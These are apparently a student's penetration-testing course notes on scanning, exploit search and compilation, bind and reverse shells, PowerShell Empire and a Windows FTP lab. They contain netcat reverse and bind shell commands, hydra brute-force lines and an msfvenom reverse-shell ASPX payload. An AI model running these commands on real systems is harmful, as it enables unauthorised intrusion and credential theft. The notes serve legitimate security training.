---
id: ecmphztkig2ypy83ols1crl
title: Exploitation
desc: ''
updated: 1675114601273
created: 1675114559455
---
## Vulnerability Scanning

### Banner Grabbing

* Nmap service detection or connect using netcat
* nmap scripts
    * /usr/share/nmap/scripts/banner.nse
    * nmap -sV --script=banner <target>
* netcat
    * nc <target> 22 --> should give you the banner for service running on port 22
* seachsploit openssh 7.2 --> should give you all the publich exploits for openssh 7.2

### Vulnerability Scanning with Nmap

* https://nmap.org/book/nse.html
* nmap packs vuln exploitation functionality, but it is not full featured
* nmap -sV --script=http-enum <target>
* ls -al /usr/share/nmap/scripts/ | grep vuln
    * ls -al /usr/share/nmap/scripts/ | grep shellshock
* nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <target>

### Vulnerability Scanning with Metasploit

* nmap for information gather
* searchsploit EternalBlue
    * shows exploits on metasploit with a tag
* from msfconsole
    * search ms17_010

## Search for Exploits

### Searching for publicly available exploits

* Exploit code itself can be weaponsized and may compromise attacker system
* Exploit DB and Rapid7 are two main databases for exploit
    * https://www.exploit-db.com
    * https://www.rapid7.com/db/ (Mainly metasploit, but has other frameworks too)
* Exploit DB has functionality to download vulnerable code for local testing
* google dorks
    * vsftpd 2.3.4 site:exploit-db.com
* https://packetstormsecurity.com/ is also a very good source of exploits. This site is mainly useful for security research

### Searching for exploits with searchsploit

* sudo apt-get update && sudo apt-get install exploitdb -y
    * ls -la /usr/share/exploitdb/exploits/
* searchsploit
    * searchsploit <keyword>: case insensitive, matches the whole metadata of exploit not just the title
    * searchsploit -c <keyword>: case sesitive search
    * searchsploit -t <keyword>: title search
    * searchsploit -e "keyword": exact match
    * searchploit remote windows smb: allows to combine multiple metadata points to search for exploits
    * searchsploit remote windows smb -w | grep -e "EternalBlue"
        * -w prints web link for the exploit, which will have more information

## Fixing Exploits

### Fixing Exploits

In most cases the publicly available exploit needs to be modified to meet our use cases.

### Cross Compiling Exploits

cross compiling is the process of compiling code for platform other than the one performing the compilation

* sudo apt-get install mingw-w64
    * This is a utility for cross compilation
* sudo apt-get install gcc
    * for c++/c exploits

Compiling for Windows from linux:

* searchsploit video lan SMB
    * searchsploit -m 9303
* i686-w64-mingw32-gcc 9303.c -o exploit_x86 -lws2_32 (32 bit windows)
* i686-w64-mingw32-gcc 9303.c -o exploit_x64 (64 bit windows)

Compiling for linux from linux

* gcc -pthread 40839.c -o exploit_linux -lcrypt
    * sometimes the eploit itself has compile instruction, like the above one.

https://gitlab.com/exploit-database/exploitdb-bin-sploits --> for pre compiled exploit binaries ready to download

## Bind and Reverse Shells

### Netcat Fundamentals

* works with both UDP and TCP
* Client mode
    * used to connect to services on ports
    * nc target_ip 80
* server mode
    * can listen to incoming connections
* example:
    * listening - TCP
        * nc -nvlp 1234 (add -u for UDP)
    * Connecting TCP
        * nc -nv target_ip 1234 (add -u for UDP)

* transfer files
    * target system
        * nc -nvlp 1234 > exploit.txt
    * source sytem
        * nc -nv target_ip 1234 < exploit.txt


### Bind Shells

* Attacker system directly connects to a listener on the Victim system
    * This will need a listener set up on target system
        * ex: nc -nvlp 1234 -e cmd.exe
* A Reverse Shell is opposite, target connects back to a listener setup on attacker system
* lab
    * setup listener on target
        * nc -nvlp 1234 -e cmd.exe (This is for windows)
        * nc -nvlp 1234 -c /bin/bash (This is for linus)
    * connect to target from attacker system
        * nc -nv <target_ip> 1234 (linux & windows)

### Reverse Shells

* Targets connects to listener on Attacker system
    * This can be done without nc, like a meterpreter payload
* Issue
    * This reveals IP address of the attacker infrastructure
* The lab
    * setup listener on attacker system
        * nc -nvlp 1234
    * connect to attacker through reverse shell
        * nc.exe -nv <attacker_ip> 1234 -e cmd.exe

### Reverse Shell cheat sheet

* https://github.com/swisskyrepo/PayloadsAllTheThings
    * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp (bash TCP)
    * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell (powershell TCP)
* https://www.revshells.com/

## Exploitation Frameworks

### Metasploit

* skipping..refer metasploit course for details
* [[link here]]

### Powershell Empire

* Pure PowerShell exploitation and post exploitation
* starkiller is GUI for powershell empire. Electron based
* setup
    * sudo apt-get update && sudo apt-get powershell-empire starkiller -y
    * sudo powershell-empire server (keep running)
    * (new tab) sudo powershell-empire client (cmdline interface)
    * starkiller app is present in app menu in kali, just open with defaults
        * username: empireadmin, password: password123
* demo
    * from starkiller
        * setup listener
        * setup stager
        * transfer stager to target
        * run stager on target
        * agent will be active in starkiller

## Windows Exploitation

### Windows black box Penetration Test

* Zero knowledge about target system, all the phases of penetration testing are conducted by penetration tester

### port scanning and enumeration

* hosts /etc/hosts --> has the target
* nmap -sV -O -T4 -PA -sC target-ip

### targeting FTP

* try anonymous login
* hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.4.21.62 ftp
    * reveals account details
* hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.4.21.62 ftp
    * reveals another account details
* msfvenom -p windows/shell/reverse_tcp LHOST=10.10.22.4 LPORT=1234 -f aspx > shell.aspx
    * upload file to ftp using compromised creds
    * start a listener on msfconsole
    * run the file in browser (NOTE: the microsoft HTTP server and FTP server are linked, any file uploaded to ftp is visible on HTTP server, so it can be run using browser)
    * This reverse shell attempt was unsuccessful